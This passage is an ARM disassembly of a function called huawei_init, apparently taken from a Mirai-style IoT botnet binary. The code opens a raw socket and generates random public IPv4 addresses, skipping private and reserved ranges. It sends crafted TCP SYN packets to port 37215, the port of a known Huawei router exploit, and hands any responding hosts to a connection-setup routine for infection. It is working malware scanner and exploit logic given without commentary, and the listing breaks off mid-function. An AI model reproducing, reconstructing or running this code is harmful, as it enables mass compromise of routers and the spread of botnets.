    f6f8:	e5851004 	str	r1, [r5, #4]
    f6fc:	85853008 	strhi	r3, [r5, #8]
    f700:	e5950000 	ldr	r0, [r5]
    f704:	e1a0100d 	mov	r1, sp
    f708:	e3a02010 	mov	r2, #16
    f70c:	eb001d2b 	bl	16bc0 <__libc_connect>
    f710:	e28dd010 	add	sp, sp, #16
    f714:	e8bd4070 	pop	{r4, r5, r6, lr}
    f718:	e12fff1e 	bx	lr
    f71c:	00028cf4 	.word	0x00028cf4

0000f720 <huawei_init>:
    f720:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    f724:	e24dde72 	sub	sp, sp, #1824	; 0x720
    f728:	e3a03000 	mov	r3, #0
    f72c:	e24dd00c 	sub	sp, sp, #12
    f730:	e58d3724 	str	r3, [sp, #1828]	; 0x724
    f734:	eb002805 	bl	19750 <__libc_fork>
    f738:	e3700001 	cmn	r0, #1
    f73c:	13a03000 	movne	r3, #0
    f740:	03a03001 	moveq	r3, #1
    f744:	e3500000 	cmp	r0, #0
    f748:	d1a04003 	movle	r4, r3
    f74c:	c3834001 	orrgt	r4, r3, #1
    f750:	e59f3a8c 	ldr	r3, [pc, #2700]	; 101e4 <huawei_init+0xac4>
    f754:	e3540000 	cmp	r4, #0
    f758:	e5830000 	str	r0, [r3]
    f75c:	0a000003 	beq	f770 <huawei_init+0x50>
    f760:	e28ddfcb 	add	sp, sp, #812	; 0x32c
    f764:	e28ddb01 	add	sp, sp, #1024	; 0x400
    f768:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    f76c:	e12fff1e 	bx	lr
    f770:	eb00159b 	bl	14de4 <util_local_addr>
    f774:	e59f1a6c 	ldr	r1, [pc, #2668]	; 101e8 <huawei_init+0xac8>
    f778:	e5810000 	str	r0, [r1]
    f77c:	eb000bb4 	bl	12654 <rand_init>
    f780:	e1a00004 	mov	r0, r4
    f784:	eb001b18 	bl	163ec <__GI_time>
    f788:	e59f2a5c 	ldr	r2, [pc, #2652]	; 101ec <huawei_init+0xacc>
    f78c:	e3a01c15 	mov	r1, #5376	; 0x1500
    f790:	e5820000 	str	r0, [r2]
    f794:	e2811020 	add	r1, r1, #32
    f798:	e3a00080 	mov	r0, #128	; 0x80
    f79c:	eb00210e 	bl	17bdc <calloc>
    f7a0:	e59f3a48 	ldr	r3, [pc, #2632]	; 101f0 <huawei_init+0xad0>
    f7a4:	e58d4724 	str	r4, [sp, #1828]	; 0x724
    f7a8:	e5830000 	str	r0, [r3]
    f7ac:	e1a03284 	lsl	r3, r4, #5
    f7b0:	e59dc724 	ldr	ip, [sp, #1828]	; 0x724
    f7b4:	e0433184 	sub	r3, r3, r4, lsl #3
    f7b8:	e1a02183 	lsl	r2, r3, #3
    f7bc:	e0632002 	rsb	r2, r3, r2
    f7c0:	e1a0128c 	lsl	r1, ip, #5
    f7c4:	e59f3a24 	ldr	r3, [pc, #2596]	; 101f0 <huawei_init+0xad0>
    f7c8:	e041118c 	sub	r1, r1, ip, lsl #3
    f7cc:	e593e000 	ldr	lr, [r3]
    f7d0:	e0822004 	add	r2, r2, r4
    f7d4:	e1a00181 	lsl	r0, r1, #3
    f7d8:	e28c4001 	add	r4, ip, #1
    f7dc:	e0610000 	rsb	r0, r1, r0
    f7e0:	e1a02282 	lsl	r2, r2, #5
    f7e4:	e082200e 	add	r2, r2, lr
    f7e8:	e080000c 	add	r0, r0, ip
    f7ec:	e3a05000 	mov	r5, #0
    f7f0:	e3e03000 	mvn	r3, #0
    f7f4:	e354007f 	cmp	r4, #127	; 0x7f
    f7f8:	e78e3280 	str	r3, [lr, r0, lsl #5]
    f7fc:	e5825008 	str	r5, [r2, #8]
    f800:	e58d4724 	str	r4, [sp, #1828]	; 0x724
    f804:	daffffe8 	ble	f7ac <huawei_init+0x8c>
    f808:	e3a00002 	mov	r0, #2
    f80c:	e3a01003 	mov	r1, #3
    f810:	e3a02006 	mov	r2, #6
    f814:	eb001e0e 	bl	17054 <__GI_socket>
    f818:	e59fc9d4 	ldr	ip, [pc, #2516]	; 101f4 <huawei_init+0xad4>
    f81c:	e3700001 	cmn	r0, #1
    f820:	e1a04000 	mov	r4, r0
    f824:	e58c0000 	str	r0, [ip]
    f828:	0a000151 	beq	fd74 <huawei_init+0x654>
    f82c:	e3a01003 	mov	r1, #3
    f830:	e1a02005 	mov	r2, r5
    f834:	eb0019de 	bl	15fb4 <__GI___libc_fcntl>
    f838:	e3a01004 	mov	r1, #4
    f83c:	e3802b02 	orr	r2, r0, #2048	; 0x800
    f840:	e1a00004 	mov	r0, r4
    f844:	eb0019da 	bl	15fb4 <__GI___libc_fcntl>
    f848:	e59fe9a4 	ldr	lr, [pc, #2468]	; 101f4 <huawei_init+0xad4>
    f84c:	e28d3e72 	add	r3, sp, #1824	; 0x720
    f850:	e2833008 	add	r3, r3, #8
    f854:	e3a02001 	mov	r2, #1
    f858:	e5232004 	str	r2, [r3, #-4]!
    f85c:	e59e0000 	ldr	r0, [lr]
    f860:	e3a0c004 	mov	ip, #4
    f864:	e1a01005 	mov	r1, r5
    f868:	e2822002 	add	r2, r2, #2
    f86c:	e58dc000 	str	ip, [sp]
    f870:	eb001de5 	bl	1700c <__GI_setsockopt>
    f874:	e3500000 	cmp	r0, #0
    f878:	1a00013a 	bne	fd68 <huawei_init+0x648>
    f87c:	eb000b5d 	bl	125f8 <rand_next>
    f880:	e1a00800 	lsl	r0, r0, #16
    f884:	e1a02820 	lsr	r2, r0, #16
    f888:	e20230ff 	and	r3, r2, #255	; 0xff
    f88c:	e1a00c20 	lsr	r0, r0, #24
    f890:	e1800403 	orr	r0, r0, r3, lsl #8
    f894:	e3500b01 	cmp	r0, #1024	; 0x400
    f898:	e58d2014 	str	r2, [sp, #20]
    f89c:	3afffff6 	bcc	f87c <huawei_init+0x15c>
    f8a0:	e59fc950 	ldr	ip, [pc, #2384]	; 101f8 <huawei_init+0xad8>
    f8a4:	e5dc3000 	ldrb	r3, [ip]
    f8a8:	e3c3300a 	bic	r3, r3, #10
    f8ac:	e3833005 	orr	r3, r3, #5
    f8b0:	e5cc3000 	strb	r3, [ip]
    f8b4:	e5dc2000 	ldrb	r2, [ip]
    f8b8:	e3c220b0 	bic	r2, r2, #176	; 0xb0
    f8bc:	e3a0eb0a 	mov	lr, #10240	; 0x2800
    f8c0:	e3822040 	orr	r2, r2, #64	; 0x40
    f8c4:	e1cce0b2 	strh	lr, [ip, #2]
    f8c8:	e5cc2000 	strb	r2, [ip]
    f8cc:	eb000b49 	bl	125f8 <rand_next>
    f8d0:	e59f1920 	ldr	r1, [pc, #2336]	; 101f8 <huawei_init+0xad8>
    f8d4:	e281b014 	add	fp, r1, #20
    f8d8:	e5db100c 	ldrb	r1, [fp, #12]
    f8dc:	e59f2914 	ldr	r2, [pc, #2324]	; 101f8 <huawei_init+0xad8>
    f8e0:	e3a03040 	mov	r3, #64	; 0x40
    f8e4:	e5c23008 	strb	r3, [r2, #8]
    f8e8:	e3c110a0 	bic	r1, r1, #160	; 0xa0
    f8ec:	e59f3904 	ldr	r3, [pc, #2308]	; 101f8 <huawei_init+0xad8>
    f8f0:	e1c200b4 	strh	r0, [r2, #4]
    f8f4:	e3811050 	orr	r1, r1, #80	; 0x50
    f8f8:	e3a02006 	mov	r2, #6
    f8fc:	e3a0cc5f 	mov	ip, #24320	; 0x5f00
    f900:	e5c32009 	strb	r2, [r3, #9]
    f904:	e28cc091 	add	ip, ip, #145	; 0x91
    f908:	e5cb100c 	strb	r1, [fp, #12]
    f90c:	e1cbc0b2 	strh	ip, [fp, #2]
    f910:	e59dc014 	ldr	ip, [sp, #20]
    f914:	e1c3c1b4 	strh	ip, [r3, #20]
    f918:	eb000b36 	bl	125f8 <rand_next>
    f91c:	e5db300d 	ldrb	r3, [fp, #13]
    f920:	e28de028 	add	lr, sp, #40	; 0x28
    f924:	e3833002 	orr	r3, r3, #2
    f928:	e24ee00e 	sub	lr, lr, #14
    f92c:	e5cb300d 	strb	r3, [fp, #13]
    f930:	e1cb00be 	strh	r0, [fp, #14]
    f934:	e58de00c 	str	lr, [sp, #12]
    f938:	e59f18ac 	ldr	r1, [pc, #2220]	; 101ec <huawei_init+0xacc>
    f93c:	e5918000 	ldr	r8, [r1]
    f940:	e1590008 	cmp	r9, r8
    f944:	0a00009c 	beq	fbbc <huawei_init+0x49c>
    f948:	e3a03000 	mov	r3, #0
    f94c:	e58d3724 	str	r3, [sp, #1828]	; 0x724
    f950:	e3a03000 	mov	r3, #0
    f954:	e58d3710 	str	r3, [sp, #1808]	; 0x710
    f958:	e58d3704 	str	r3, [sp, #1796]	; 0x704
    f95c:	e58d3708 	str	r3, [sp, #1800]	; 0x708
    f960:	e58d370c 	str	r3, [sp, #1804]	; 0x70c
    f964:	eb000b23 	bl	125f8 <rand_next>
    f968:	e59f2878 	ldr	r2, [pc, #2168]	; 101e8 <huawei_init+0xac8>
    f96c:	e59fc884 	ldr	ip, [pc, #2180]	; 101f8 <huawei_init+0xad8>
    f970:	e5923000 	ldr	r3, [r2]
    f974:	e1cc00b4 	strh	r0, [ip, #4]
    f978:	e58c300c 	str	r3, [ip, #12]
    f97c:	eb000b1d 	bl	125f8 <rand_next>
    f980:	e1a04000 	mov	r4, r0
    f984:	e3a00000 	mov	r0, #0
    f988:	eb001a97 	bl	163ec <__GI_time>
    f98c:	e20450ff 	and	r5, r4, #255	; 0xff
    f990:	eb0023e0 	bl	18918 <srand>
    f994:	e1a03424 	lsr	r3, r4, #8
    f998:	e1a02824 	lsr	r2, r4, #16
    f99c:	e3550000 	cmp	r5, #0
    f9a0:	1355007f 	cmpne	r5, #127	; 0x7f
    f9a4:	e20360ff 	and	r6, r3, #255	; 0xff
    f9a8:	e20270ff 	and	r7, r2, #255	; 0xff
    f9ac:	e1a04c24 	lsr	r4, r4, #24
    f9b0:	0afffff1 	beq	f97c <huawei_init+0x25c>
    f9b4:	e3550003 	cmp	r5, #3
    f9b8:	0affffef 	beq	f97c <huawei_init+0x25c>
    f9bc:	e245300f 	sub	r3, r5, #15
    f9c0:	e3550038 	cmp	r5, #56	; 0x38
    f9c4:	13530001 	cmpne	r3, #1
    f9c8:	9affffeb 	bls	f97c <huawei_init+0x25c>
    f9cc:	e355000a 	cmp	r5, #10
    f9d0:	0affffe9 	beq	f97c <huawei_init+0x25c>
    f9d4:	e35500c0 	cmp	r5, #192	; 0xc0
    f9d8:	035600a8 	cmpeq	r6, #168	; 0xa8
    f9dc:	0affffe6 	beq	f97c <huawei_init+0x25c>
    f9e0:	e35500ac 	cmp	r5, #172	; 0xac
    f9e4:	13a03000 	movne	r3, #0
    f9e8:	03a03001 	moveq	r3, #1
    f9ec:	e356000f 	cmp	r6, #15
    f9f0:	93a03000 	movls	r3, #0
    f9f4:	e3530000 	cmp	r3, #0
    f9f8:	0a000001 	beq	fa04 <huawei_init+0x2e4>
    f9fc:	e356001f 	cmp	r6, #31
    fa00:	9affffdd 	bls	f97c <huawei_init+0x25c>
    fa04:	e3550064 	cmp	r5, #100	; 0x64
    fa08:	13a03000 	movne	r3, #0
    fa0c:	03a03001 	moveq	r3, #1
    fa10:	e356003f 	cmp	r6, #63	; 0x3f
    fa14:	93a03000 	movls	r3, #0
    fa18:	e3530000 	cmp	r3, #0
    fa1c:	0a000001 	beq	fa28 <huawei_init+0x308>
    fa20:	e356007e 	cmp	r6, #126	; 0x7e
    fa24:	9affffd4 	bls	f97c <huawei_init+0x25c>
    fa28:	e35500a9 	cmp	r5, #169	; 0xa9
    fa2c:	035600ff 	cmpeq	r6, #255	; 0xff
    fa30:	0affffd1 	beq	f97c <huawei_init+0x25c>
    fa34:	e35500c6 	cmp	r5, #198	; 0xc6
    fa38:	13a03000 	movne	r3, #0
    fa3c:	03a03001 	moveq	r3, #1
    fa40:	e3560011 	cmp	r6, #17
    fa44:	93a03000 	movls	r3, #0
    fa48:	e3530000 	cmp	r3, #0
    fa4c:	0a000001 	beq	fa58 <huawei_init+0x338>
    fa50:	e3560013 	cmp	r6, #19
    fa54:	9affffc8 	bls	f97c <huawei_init+0x25c>
    fa58:	e35500df 	cmp	r5, #223	; 0xdf
    fa5c:	8affffc6 	bhi	f97c <huawei_init+0x25c>
    fa60:	e2453006 	sub	r3, r5, #6
    fa64:	e355000b 	cmp	r5, #11
    fa68:	13530001 	cmpne	r3, #1
    fa6c:	9affffc2 	bls	f97c <huawei_init+0x25c>
    fa70:	e3550016 	cmp	r5, #22
    fa74:	13550015 	cmpne	r5, #21
    fa78:	0affffbf 	beq	f97c <huawei_init+0x25c>
    fa7c:	e355001c 	cmp	r5, #28
    fa80:	1355001a 	cmpne	r5, #26
    fa84:	0affffbc 	beq	f97c <huawei_init+0x25c>
    fa88:	e355001e 	cmp	r5, #30
    fa8c:	1355001d 	cmpne	r5, #29
    fa90:	0affffb9 	beq	f97c <huawei_init+0x25c>
    fa94:	e3550037 	cmp	r5, #55	; 0x37
    fa98:	13550021 	cmpne	r5, #33	; 0x21
    fa9c:	0affffb6 	beq	f97c <huawei_init+0x25c>
    faa0:	e35500d7 	cmp	r5, #215	; 0xd7
    faa4:	135500d6 	cmpne	r5, #214	; 0xd6
    faa8:	0affffb3 	beq	f97c <huawei_init+0x25c>
    faac:	eb00230c 	bl	186e4 <rand>
    fab0:	e59f3744 	ldr	r3, [pc, #1860]	; 101fc <huawei_init+0xadc>
    fab4:	e0c2e093 	smull	lr, r2, r3, r0
    fab8:	e0422fc0 	sub	r2, r2, r0, asr #31
    fabc:	e1a03082 	lsl	r3, r2, #1
    fac0:	e0833002 	add	r3, r3, r2
    fac4:	e0502003 	subs	r2, r0, r3
    fac8:	0384349d 	orreq	r3, r4, #-1660944384	; 0x9d000000
    facc:	01833806 	orreq	r3, r3, r6, lsl #16
    fad0:	0a0000f7 	beq	feb4 <huawei_init+0x794>
    fad4:	e3520001 	cmp	r2, #1
    fad8:	038434c5 	orreq	r3, r4, #-989855744	; 0xc5000000
    fadc:	01833806 	orreq	r3, r3, r6, lsl #16
    fae0:	0a0000f3 	beq	feb4 <huawei_init+0x794>
    fae4:	e3520002 	cmp	r2, #2
    fae8:	03843429 	orreq	r3, r4, #687865856	; 0x29000000
    faec:	01833806 	orreq	r3, r3, r6, lsl #16
    faf0:	0a0000ef 	beq	feb4 <huawei_init+0x794>
    faf4:	e3520003 	cmp	r2, #3
    faf8:	0a0000ea 	beq	fea8 <huawei_init+0x788>
    fafc:	e59f06f4 	ldr	r0, [pc, #1780]	; 101f8 <huawei_init+0xad8>
    fb00:	e59d2010 	ldr	r2, [sp, #16]
    fb04:	e3a03000 	mov	r3, #0
    fb08:	e3a01014 	mov	r1, #20
    fb0c:	e5802010 	str	r2, [r0, #16]
    fb10:	e1c030ba 	strh	r3, [r0, #10]
    fb14:	ebfffb55 	bl	e870 <checksum_generic>
    fb18:	e59fc6d8 	ldr	ip, [pc, #1752]	; 101f8 <huawei_init+0xad8>
    fb1c:	e59ce010 	ldr	lr, [ip, #16]
    fb20:	e1cc00ba 	strh	r0, [ip, #10]
    fb24:	e1a0000c 	mov	r0, ip
    fb28:	e3a0cc5f 	mov	ip, #24320	; 0x5f00
    fb2c:	e28cc091 	add	ip, ip, #145	; 0x91
    fb30:	e58be004 	str	lr, [fp, #4]
    fb34:	e3a0e000 	mov	lr, #0
    fb38:	e2801014 	add	r1, r0, #20
    fb3c:	e3a02b05 	mov	r2, #5120	; 0x1400
    fb40:	e3a03014 	mov	r3, #20
    fb44:	e1cbc0b2 	strh	ip, [fp, #2]
    fb48:	e1cbe1b0 	strh	lr, [fp, #16]
    fb4c:	ebfffb5b 	bl	e8c0 <checksum_tcpudp>
    fb50:	e59f26a0 	ldr	r2, [pc, #1696]	; 101f8 <huawei_init+0xad8>
    fb54:	e59f1698 	ldr	r1, [pc, #1688]	; 101f4 <huawei_init+0xad4>
    fb58:	e592e010 	ldr	lr, [r2, #16]
    fb5c:	e3a0c010 	mov	ip, #16
    fb60:	e5913000 	ldr	r3, [r1]
    fb64:	e1cb01b0 	strh	r0, [fp, #16]
    fb68:	e58de708 	str	lr, [sp, #1800]	; 0x708
    fb6c:	e58dc004 	str	ip, [sp, #4]
    fb70:	e3a0e002 	mov	lr, #2
    fb74:	e28dcc07 	add	ip, sp, #1792	; 0x700
    fb78:	e1cce0b4 	strh	lr, [ip, #4]
    fb7c:	e1dbe0b2 	ldrh	lr, [fp, #2]
    fb80:	e1cce0b6 	strh	lr, [ip, #6]
    fb84:	e28dcc07 	add	ip, sp, #1792	; 0x700
    fb88:	e1a00003 	mov	r0, r3
    fb8c:	e1a01002 	mov	r1, r2
    fb90:	e3a03901 	mov	r3, #16384	; 0x4000
    fb94:	e28cc004 	add	ip, ip, #4
    fb98:	e3a02028 	mov	r2, #40	; 0x28
    fb9c:	e58dc000 	str	ip, [sp]
    fba0:	eb001cf7 	bl	16f84 <__libc_sendto>
    fba4:	e59d3724 	ldr	r3, [sp, #1828]	; 0x724
    fba8:	e2833001 	add	r3, r3, #1
    fbac:	e353009f 	cmp	r3, #159	; 0x9f
    fbb0:	e58d3724 	str	r3, [sp, #1828]	; 0x724
    fbb4:	daffff65 	ble	f950 <huawei_init+0x230>
    fbb8:	e1a09008 	mov	r9, r8
    fbbc:	eb001b25 	bl	16858 <__GI___errno_location>
    fbc0:	e59de00c 	ldr	lr, [sp, #12]
    fbc4:	e1a0a000 	mov	sl, r0
    fbc8:	e28e5014 	add	r5, lr, #20
    fbcc:	e3a04000 	mov	r4, #0
    fbd0:	e3a0c000 	mov	ip, #0
    fbd4:	e58ac000 	str	ip, [sl]
    fbd8:	e59f1614 	ldr	r1, [pc, #1556]	; 101f4 <huawei_init+0xad4>
    fbdc:	e3a02e5e 	mov	r2, #1504	; 0x5e0
    fbe0:	e5910000 	ldr	r0, [r1]
    fbe4:	e282200a 	add	r2, r2, #10
    fbe8:	e59d100c 	ldr	r1, [sp, #12]
    fbec:	e3a03901 	mov	r3, #16384	; 0x4000
    fbf0:	e58dc004 	str	ip, [sp, #4]
    fbf4:	e58dc000 	str	ip, [sp]
    fbf8:	eb001c7f 	bl	16dfc <__libc_recvfrom>
    fbfc:	e3500000 	cmp	r0, #0
    fc00:	da00005d 	ble	fd7c <huawei_init+0x65c>
    fc04:	e59a3000 	ldr	r3, [sl]
    fc08:	e353000b 	cmp	r3, #11
    fc0c:	0a00005a 	beq	fd7c <huawei_init+0x65c>
    fc10:	e3500027 	cmp	r0, #39	; 0x27
    fc14:	9affffed 	bls	fbd0 <huawei_init+0x4b0>
    fc18:	e59d300c 	ldr	r3, [sp, #12]
    fc1c:	e59fc5c4 	ldr	ip, [pc, #1476]	; 101e8 <huawei_init+0xac8>
    fc20:	e5932010 	ldr	r2, [r3, #16]
    fc24:	e59c3000 	ldr	r3, [ip]
    fc28:	e1520003 	cmp	r2, r3
    fc2c:	1affffe7 	bne	fbd0 <huawei_init+0x4b0>
    fc30:	e59de00c 	ldr	lr, [sp, #12]
    fc34:	e5de3009 	ldrb	r3, [lr, #9]
    fc38:	e3530006 	cmp	r3, #6
    fc3c:	1affffe3 	bne	fbd0 <huawei_init+0x4b0>
    fc40:	e3a03c5f 	mov	r3, #24320	; 0x5f00
    fc44:	e1d560b0 	ldrh	r6, [r5]
    fc48:	e2833091 	add	r3, r3, #145	; 0x91
    fc4c:	e1560003 	cmp	r6, r3
    fc50:	1affffde 	bne	fbd0 <huawei_init+0x4b0>
    fc54:	e1d530b2 	ldrh	r3, [r5, #2]
    fc58:	e59d1014 	ldr	r1, [sp, #20]
    fc5c:	e1530001 	cmp	r3, r1
    fc60:	1affffda 	bne	fbd0 <huawei_init+0x4b0>
    fc64:	e5d5300d 	ldrb	r3, [r5, #13]
    fc68:	e3130002 	tst	r3, #2
    fc6c:	0affffd7 	beq	fbd0 <huawei_init+0x4b0>
    fc70:	e3130010 	tst	r3, #16
    fc74:	0affffd5 	beq	fbd0 <huawei_init+0x4b0>
    fc78:	e3130004 	tst	r3, #4
    fc7c:	1affffd3 	bne	fbd0 <huawei_init+0x4b0>
    fc80:	e3130001 	tst	r3, #1
    fc84:	1affffd1 	bne	fbd0 <huawei_init+0x4b0>
    fc88:	e5951008 	ldr	r1, [r5, #8]
    fc8c:	e20108ff 	and	r0, r1, #16711680	; 0xff0000
    fc90:	e1a02c21 	lsr	r2, r1, #24
    fc94:	e2013cff 	and	r3, r1, #65280	; 0xff00
    fc98:	e1822420 	orr	r2, r2, r0, lsr #8
    fc9c:	e1822403 	orr	r2, r2, r3, lsl #8
    fca0:	e1822c01 	orr	r2, r2, r1, lsl #24
    fca4:	e2422001 	sub	r2, r2, #1
    fca8:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
    fcac:	e1a03c22 	lsr	r3, r2, #24
    fcb0:	e1833420 	orr	r3, r3, r0, lsr #8
    fcb4:	e2021cff 	and	r1, r2, #65280	; 0xff00
    fcb8:	e1833401 	orr	r3, r3, r1, lsl #8
    fcbc:	e59ee00c 	ldr	lr, [lr, #12]
    fcc0:	e1833c02 	orr	r3, r3, r2, lsl #24
    fcc4:	e153000e 	cmp	r3, lr
    fcc8:	1affffc0 	bne	fbd0 <huawei_init+0x4b0>
    fccc:	e354007f 	cmp	r4, #127	; 0x7f
    fcd0:	ca000029 	bgt	fd7c <huawei_init+0x65c>
    fcd4:	e1a03284 	lsl	r3, r4, #5
    fcd8:	e0433184 	sub	r3, r3, r4, lsl #3
    fcdc:	e1a02183 	lsl	r2, r3, #3
    fce0:	e0632002 	rsb	r2, r3, r2
    fce4:	e59f3504 	ldr	r3, [pc, #1284]	; 101f0 <huawei_init+0xad0>
    fce8:	e0822004 	add	r2, r2, r4
    fcec:	e593c000 	ldr	ip, [r3]
    fcf0:	e1a02282 	lsl	r2, r2, #5
    fcf4:	e082000c 	add	r0, r2, ip
    fcf8:	e5903008 	ldr	r3, [r0, #8]
    fcfc:	e3530000 	cmp	r3, #0
    fd00:	12841001 	addne	r1, r4, #1
    fd04:	11a02281 	lslne	r2, r1, #5
    fd08:	10422181 	subne	r2, r2, r1, lsl #3
    fd0c:	11a03182 	lslne	r3, r2, #3
    fd10:	10623003 	rsbne	r3, r2, r3
    fd14:	10833001 	addne	r3, r3, r1
    fd18:	11a03283 	lslne	r3, r3, #5
    fd1c:	108c3003 	addne	r3, ip, r3
    fd20:	11a01004 	movne	r1, r4
    fd24:	0a000009 	beq	fd50 <huawei_init+0x630>
    fd28:	e2811001 	add	r1, r1, #1
    fd2c:	e3510080 	cmp	r1, #128	; 0x80
    fd30:	0a000011 	beq	fd7c <huawei_init+0x65c>
    fd34:	e1a00003 	mov	r0, r3
    fd38:	e5933008 	ldr	r3, [r3, #8]
    fd3c:	e3530000 	cmp	r3, #0
    fd40:	e2803c15 	add	r3, r0, #5376	; 0x1500
    fd44:	e2833020 	add	r3, r3, #32
    fd48:	1afffff6 	bne	fd28 <huawei_init+0x608>
    fd4c:	e1a04001 	mov	r4, r1
    fd50:	e3500000 	cmp	r0, #0
    fd54:	0a000008 	beq	fd7c <huawei_init+0x65c>
    fd58:	e580e00c 	str	lr, [r0, #12]
    fd5c:	e1c061b0 	strh	r6, [r0, #16]
    fd60:	ebfffe39 	bl	f64c <huawei_setup_connection>
    fd64:	eaffff99 	b	fbd0 <huawei_init+0x4b0>
    fd68:	e59f1484 	ldr	r1, [pc, #1156]	; 101f4 <huawei_init+0xad4>
    fd6c:	e5910000 	ldr	r0, [r1]
    fd70:	eb002832 	bl	19e40 <__GI___libc_close>
    fd74:	e1a00005 	mov	r0, r5
    fd78:	eb002467 	bl	18f1c <__GI_exit>
    fd7c:	e3a03000 	mov	r3, #0
    fd80:	e58d3684 	str	r3, [sp, #1668]	; 0x684
    fd84:	e3a02004 	mov	r2, #4
    fd88:	e282cd1a 	add	ip, r2, #1664	; 0x680
    fd8c:	e2822004 	add	r2, r2, #4
    fd90:	e3a03000 	mov	r3, #0
    fd94:	e28cc004 	add	ip, ip, #4
    fd98:	e3520080 	cmp	r2, #128	; 0x80
    fd9c:	e78c300d 	str	r3, [ip, sp]
    fda0:	1afffff8 	bne	fd88 <huawei_init+0x668>
    fda4:	e58d3604 	str	r3, [sp, #1540]	; 0x604
    fda8:	e2833004 	add	r3, r3, #4
    fdac:	e283ec06 	add	lr, r3, #1536	; 0x600
    fdb0:	e2833004 	add	r3, r3, #4
    fdb4:	e3a02000 	mov	r2, #0
    fdb8:	e28ee004 	add	lr, lr, #4
    fdbc:	e3530080 	cmp	r3, #128	; 0x80
    fdc0:	e78e200d 	str	r2, [lr, sp]
    fdc4:	1afffff8 	bne	fdac <huawei_init+0x68c>
    fdc8:	e1a08002 	mov	r8, r2
    fdcc:	e1a07002 	mov	r7, r2
    fdd0:	e1a01002 	mov	r1, r2
    fdd4:	e58d2724 	str	r2, [sp, #1828]	; 0x724
    fdd8:	ea000016 	b	fe38 <huawei_init+0x718>
    fddc:	e3510003 	cmp	r1, #3
    fde0:	13510001 	cmpne	r1, #1
    fde4:	0a000001 	beq	fdf0 <huawei_init+0x6d0>
    fde8:	e3510004 	cmp	r1, #4
    fdec:	1a000039 	bne	fed8 <huawei_init+0x7b8>
    fdf0:	e795c006 	ldr	ip, [r5, r6]
    fdf4:	e28d3e72 	add	r3, sp, #1824	; 0x720
    fdf8:	e1a022ac 	lsr	r2, ip, #5
    fdfc:	e2833008 	add	r3, r3, #8
    fe00:	e1a02102 	lsl	r2, r2, #2
    fe04:	e0822003 	add	r2, r2, r3
    fe08:	e5121124 	ldr	r1, [r2, #-292]	; 0xfffffedc
    fe0c:	e20c001f 	and	r0, ip, #31
    fe10:	e3a03001 	mov	r3, #1
    fe14:	e1811013 	orr	r1, r1, r3, lsl r0
    fe18:	e15c0007 	cmp	ip, r7
    fe1c:	e5021124 	str	r1, [r2, #-292]	; 0xfffffedc
    fe20:	c1a0700c 	movgt	r7, ip
    fe24:	e59d3724 	ldr	r3, [sp, #1828]	; 0x724
    fe28:	e2831001 	add	r1, r3, #1
    fe2c:	e351007f 	cmp	r1, #127	; 0x7f
    fe30:	e58d1724 	str	r1, [sp, #1828]	; 0x724
    fe34:	ca000035 	bgt	ff10 <huawei_init+0x7f0>
    fe38:	e1a03281 	lsl	r3, r1, #5
    fe3c:	e0433181 	sub	r3, r3, r1, lsl #3
    fe40:	e1a02183 	lsl	r2, r3, #3
    fe44:	e0632002 	rsb	r2, r3, r2
    fe48:	e0822001 	add	r2, r2, r1
    fe4c:	e59f139c 	ldr	r1, [pc, #924]	; 101f0 <huawei_init+0xad0>
    fe50:	e5916000 	ldr	r6, [r1]
    fe54:	e1a05282 	lsl	r5, r2, #5
    fe58:	e0854006 	add	r4, r5, r6
    fe5c:	e5941008 	ldr	r1, [r4, #8]
    fe60:	e3510000 	cmp	r1, #0
    fe64:	0affffee 	beq	fe24 <huawei_init+0x704>
    fe68:	e59f237c 	ldr	r2, [pc, #892]	; 101ec <huawei_init+0xacc>
    fe6c:	e5923000 	ldr	r3, [r2]
    fe70:	e5942004 	ldr	r2, [r4, #4]
    fe74:	e0623003 	rsb	r3, r2, r3
    fe78:	e3530005 	cmp	r3, #5
    fe7c:	9affffd6 	bls	fddc <huawei_init+0x6bc>
    fe80:	e7950006 	ldr	r0, [r5, r6]
    fe84:	eb0027ed 	bl	19e40 <__GI___libc_close>
    fe88:	e3e03000 	mvn	r3, #0
    fe8c:	e3a02000 	mov	r2, #0
    fe90:	e7853006 	str	r3, [r5, r6]
    fe94:	e5842008 	str	r2, [r4, #8]
    fe98:	e2840018 	add	r0, r4, #24
    fe9c:	e3a01c01 	mov	r1, #256	; 0x100
    fea0:	eb001345 	bl	14bbc <util_zero>
    fea4:	eaffffde 	b	fe24 <huawei_init+0x704>
    fea8:	e1a03806 	lsl	r3, r6, #16
    feac:	e1833c05 	orr	r3, r3, r5, lsl #24
    feb0:	e1833004 	orr	r3, r3, r4
    feb4:	e1833407 	orr	r3, r3, r7, lsl #8
    feb8:	e20308ff 	and	r0, r3, #16711680	; 0xff0000
    febc:	e1a02c23 	lsr	r2, r3, #24
    fec0:	e2031cff 	and	r1, r3, #65280	; 0xff00
    fec4:	e1822420 	orr	r2, r2, r0, lsr #8
    fec8:	e1822401 	orr	r2, r2, r1, lsl #8
    fecc:	e1823c03 	orr	r3, r2, r3, lsl #24
    fed0:	e58d3010 	str	r3, [sp, #16]
    fed4:	eaffff08 	b	fafc <huawei_init+0x3dc>
    fed8:	e795c006 	ldr	ip, [r5, r6]
    fedc:	e28dee72 	add	lr, sp, #1824	; 0x720
    fee0:	e1a032ac 	lsr	r3, ip, #5
    fee4:	e1a03103 	lsl	r3, r3, #2
    fee8:	e28ee008 	add	lr, lr, #8
    feec:	e083300e 	add	r3, r3, lr
    fef0:	e51320a4 	ldr	r2, [r3, #-164]	; 0xffffff5c
    fef4:	e20c001f 	and	r0, ip, #31
    fef8:	e3a01001 	mov	r1, #1
    fefc:	e1822011 	orr	r2, r2, r1, lsl r0
    ff00:	e158000c 	cmp	r8, ip
    ff04:	b1a0800c 	movlt	r8, ip
    ff08:	e50320a4 	str	r2, [r3, #-164]	; 0xffffff5c
    ff0c:	eaffffc4 	b	fe24 <huawei_init+0x704>
    ff10:	e3a0c001 	mov	ip, #1
    ff14:	e3a04000 	mov	r4, #0
    ff18:	e58dc714 	str	ip, [sp, #1812]	; 0x714
    ff1c:	e1570008 	cmp	r7, r8
    ff20:	a1a00007 	movge	r0, r7
    ff24:	b1a00008 	movlt	r0, r8
    ff28:	e28d1d1a 	add	r1, sp, #1664	; 0x680
    ff2c:	e28d2c06 	add	r2, sp, #1536	; 0x600
    ff30:	e28dce71 	add	ip, sp, #1808	; 0x710
    ff34:	e28cc004 	add	ip, ip, #4
